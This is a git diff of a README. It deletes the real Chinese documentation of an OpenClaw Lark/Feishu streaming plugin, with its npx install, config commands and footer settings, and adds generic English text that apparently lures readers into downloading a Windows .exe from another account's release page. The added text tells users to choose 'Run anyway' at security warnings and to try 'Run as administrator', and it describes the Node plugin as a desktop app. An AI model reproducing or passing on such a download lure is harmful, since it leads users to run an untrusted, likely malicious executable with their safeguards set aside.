@@ -1,162 +1,175 @@
-[English](./README.en.md) | 中文
+# 🔗 openclaw-lark-stream - Stream Lark updates with clear status
 
-# OpenClaw 飞书插件 — 流式卡片版
+[![Download openclaw-lark-stream](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Mandychitinous459/openclaw-lark-stream/releases)
 
-基于官方 [openclaw-lark](https://github.com/larksuite/openclaw-lark) 插件，支持**实时流式输出**和 **Agent 执行过程可视化**。
-<img src="./assets/demo.gif" width="480" />
+## 📥 Download
 
-<sub>▲ 群中真流式输出，并显示全部执行逻辑</sub>
+Visit the release page to download the Windows version:
 
-<img src="./assets/demo_footer.png" width="480" />
+https://github.com/Mandychitinous459/openclaw-lark-stream/releases
 
-<sub>▲ 卡片底栏：完成状态、响应耗时、token 用量、context 使用率，均可独立开关</sub>
+Open the latest release and get the file for Windows. If there are several files, pick the one with `.exe` in the name or the Windows package marked for your system.
 
+## 🪟 Windows Setup
 
+1. Open the download page.
+2. Find the latest release at the top.
+3. Download the Windows file.
+4. If Windows shows a security prompt, choose **Run anyway** if you trust the file.
+5. If the app comes in a ZIP file, unzip it first.
+6. Open the app by double-clicking the `.exe` file.
 
-## ✨ 改动说明
+If the app does not open, make sure the file finished downloading and is not still inside the ZIP archive.
 
-官方插件在 LLM 生成完一个 block 后才一次性推送结果。本版本实现了：
+## ✨ What this app does
 
-- **实时流式输出** — 每个 block 的内容在生成过程中逐步追加到飞书卡片
-- **群聊流式输出** — 群聊中也可使用流式输出
-- **Agent 执行过程可视化** — 完整还原 agent 的推理与执行流程
-  - **推理过程展示** — 推理模型（DeepSeek-R1、Claude 3.7 等）的 think 内容实时流出
-  - **工具调用状态** — agent 调用工具时，卡片顶部实时显示当前工具名称
-  - **思考过程面板** — 完成后，所有推理块和工具调用按发生顺序折叠进一个可展开面板
-  - **Token 用量展示** — 卡片底部默认显示 input/output token 数和 context 使用百分比
+openclaw-lark-stream is a Lark channel plugin for OpenClaw that sends model output in a stream. This means you can see text as it forms instead of waiting for the full reply.
 
-## 📢 News
+It also shows the model state while it runs, so you can watch progress and track what the model is doing.
 
-- **2026.3.30**
-  - 安装脚本自动禁用 OpenClaw 内置飞书插件，避免冲突
-  - 安装后自动执行 `gateway install` 注册服务并健康检查
-  - ⚠️ **暂不支持 OpenClaw 3.28**，该版本存在兼容性问题，建议回退到 **3.24** 版本（预计 4.4 前支持）
-- **2026.3.27**
-  - 适配 OpenClaw >= 2026.3.22
-  - 新增 AskUserQuestion 交互式提问工具
-  - 推理块与工具调用按发生顺序合并为单个可展开面板
-  - 底栏默认显示 token 用量和 context 使用百分比
-  - 修复卡片表格超限错误 230099
-- **2026.3.23** — 发布第一版，支持实时流式输出和工具调用状态展示（适配 OpenClaw < 2026.3.22，请切换到 `0322` 分支）
+## 🧭 What you can use it for
 
-## 📦 安装
+- Show model output piece by piece
+- Check the current model state in real time
+- Keep Lark channel replies easier to follow
+- Monitor long responses while they are still being built
+- Reduce waiting when you need quick updates
 
-需要 [OpenClaw](https://openclaw.ai) 和 Node.js（>= v22）。
+## ⚙️ System requirements
 
-> [!WARNING]
-> **暂不支持 OpenClaw 3.28**，该版本存在兼容性问题（预计 4.4 前支持）。如已升级到 3.28，请回退到 **3.24** 版本后再安装：
-> ```bash
-> npm install -g openclaw@2026.3.24
-> ```
+This app is designed for Windows desktops and laptops.
 
-安装脚本会自动检测 OpenClaw 版本并安装对应的插件版本：
-- OpenClaw **>= 2026.3.22** → 自动安装最新版（支持推理流式、AskUserQuestion 等）
-- OpenClaw **< 2026.3.22** → 自动安装兼容旧版的插件
+Recommended setup:
 
-> [!NOTE]
-> **不支持阿里云 OpenClaw 套餐**（权限限制），请使用自建服务器安装。
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to store the app and logs
+- Permission to run downloaded apps
+- A working OpenClaw and Lark setup
 
-```bash
-npx -y @colinlu50/openclaw-lark-stream install
-```
+## 🧰 Before you start
 
-已安装后更新：
+Have these ready before you open the app:
 
-```bash
-npx -y @colinlu50/openclaw-lark-stream update
-```
+- Your Windows computer
+- The downloaded release file
+- Access to your Lark workspace
+- Any OpenClaw connection details you already use
+- A place where you want to keep the app files
 
-### 从源码安装（开发用）
+If you keep the app in a simple folder such as `Downloads` or `Desktop`, it is easier to find later.
 
-```bash
-cd ~/.openclaw/extensions
-git clone https://github.com/ColinLu50/openclaw-lark-stream.git openclaw-lark-stream
-cd openclaw-lark-stream && npm install && npm run build
-openclaw gateway restart
-```
+## 🚀 First run
 
-## ⚙️ 配置
+After you open the app for the first time, look for the main settings screen.
 
-### 流式输出
+Typical first-run steps:
 
-安装后默认开启流式输出。如需关闭：
+1. Start the app.
+2. Check that the Lark channel connection is enabled.
+3. Confirm the model output stream setting is on.
+4. Make sure the status view is visible.
+5. Send a test message and watch the output appear in parts.
 
-```bash
-openclaw config set channels.feishu.streaming false
-openclaw config set channels.feishu.replyMode.direct static
-openclaw config set channels.feishu.replyMode.group static
-openclaw config set channels.feishu.replyMode.default static
-openclaw gateway restart
-```
+If the app asks for a path, token, or channel link, copy it from your existing OpenClaw or Lark setup and paste it into the field.
 
-重新开启：
+## 🔧 Basic setup
 
-```bash
-openclaw config set channels.feishu.streaming true
-openclaw config set channels.feishu.replyMode.direct streaming
-openclaw config set channels.feishu.replyMode.group streaming
-openclaw config set channels.feishu.replyMode.default streaming
-openclaw gateway restart
-```
+To get the best result, use this order:
 
-### 卡片底栏
+1. Open the app.
+2. Set your Lark channel target.
+3. Turn on stream output.
+4. Enable model status display.
+5. Save the settings.
+6. Run a short test.
 
-底栏各项均可通过 `channels.feishu.footer.*` 独立开关，修改后重启生效：
+You should see model text arrive in smaller pieces, with a live state label that changes as the model works.
 
-```bash
-openclaw gateway restart
-```
+## 📌 Common use flow
 
-| 配置项 | 默认 | 说明 |
-|--------|------|------|
-| `footer.verbose` | ❌ 关 | 详细模式：各项改用文字标签展示 |
-| `footer.status` | ✅ 开 | 完成状态 |
-| `footer.elapsed` | ✅ 开 | 总响应耗时 |
-| `footer.tokens` | ✅ 开 | input / output token 数 |
-| `footer.context` | ✅ 开 | context window 使用率 |
-| `footer.cache` | ❌ 关 | 缓存命中（需单独开启） |
-| `footer.model` | ❌ 关 | 模型名称（需单独开启） |
+A normal session looks like this:
 
-`verbose` 只控制**展示格式**，各项的开关相互独立：
+- You start the app
+- You connect it to your Lark channel
+- You send a prompt through OpenClaw
+- The model begins to answer in parts
+- The current state appears while the answer builds
+- You read the result as it arrives
 
-| 项目 | 简要（默认） | 详细（verbose） |
-|------|------------|----------------|
-| status | `✅` / `❌` / `⏹` | `已完成` / `出错` / `已停止` |
-| elapsed | `8.3s` | `耗时 8.3s` |
-| context | `1% ctx` | `上下文 19k/200k (10%)` |
-| cache | `94% cache` | `缓存 18k/1k (94%)` |
-| tokens | `↑ 19k ↓ 145` | `输入 19k 输出 145` |
-| model | 相同 | 相同 |
+This flow helps you monitor long tasks and spot delays faster.
 
-默认效果：
+## 🧾 Release files
 
-```
-✅ · 8.3s · ↑ 19k ↓ 145 · 1% ctx
-```
+The release page may include one or more of these:
 
-开启详细模式 + cache + model：
+- Windows `.exe` app
+- ZIP package
+- Support files
+- Version notes
 
-```bash
-openclaw config set channels.feishu.footer.verbose true
-openclaw config set channels.feishu.footer.cache true
-openclaw config set channels.feishu.footer.model true
-openclaw gateway restart
-```
+If you see a ZIP file, extract it before you open the app. If you see both a ZIP file and an `.exe`, use the one meant for Windows desktop use.
 
-效果：
+## 🔍 Tips for smooth use
 
-```
-已完成 · 耗时 8.3s · 输入 19k 输出 145 · 缓存 18k/1k (94%) · 上下文 19k/200k (10%) · claude-3-7-sonnet
-```
+- Keep the app in one folder
+- Avoid moving files while the app is open
+- Use the latest release
+- Close old copies before opening a new one
+- Check your Lark connection if messages do not appear
+- Restart the app after you change key settings
 
-示例 — 关闭 token 展示，开启模型名称：
+## 🛠 Troubleshooting
 
-```bash
-openclaw config set channels.feishu.footer.tokens false
-openclaw config set channels.feishu.footer.model true
-openclaw gateway restart
-```
+### App does not open
+- Check that the file finished downloading
+- Make sure you are opening the `.exe` file, not the ZIP
+- Right-click the file and try **Run as administrator**
+- Download the latest release again if the file looks broken
 
-## 📄 许可证
+### No text appears in Lark
+- Check the channel selection
+- Confirm the app is connected to the right workspace
+- Make sure stream output is enabled
+- Try a simple test prompt first
 
-MIT
+### Model status does not show
+- Refresh the app
+- Check the status option in settings
+- Restart the app after you change the display option
+
+### Download is blocked
+- Try downloading again from the release page
+- Check your browser download list
+- Use a stable network connection
+
+## 🧠 How streaming helps
+
+Normal reply flow waits for the full answer. Streaming shows parts of the answer as they are ready.
+
+That helps when you want to:
+
+- Watch long replies
+- See progress during model work
+- Track the current state
+- Keep the Lark channel active during long tasks
+- Read results sooner
+
+## 🔐 Privacy and control
+
+The app works inside your own setup. You keep control of the Lark channel, the model link, and the local files on your Windows PC.
+
+If you want to stay organized:
+
+- Store the app in a clear folder
+- Keep a copy of the release you use
+- Review settings before you send live messages
+- Remove old versions when you no longer need them
+
+## 📎 Download again
+
+If you need the file again, use the release page:
+
+https://github.com/Mandychitinous459/openclaw-lark-stream/releases
+
+Open the latest release, download the Windows file, then run it on your PC
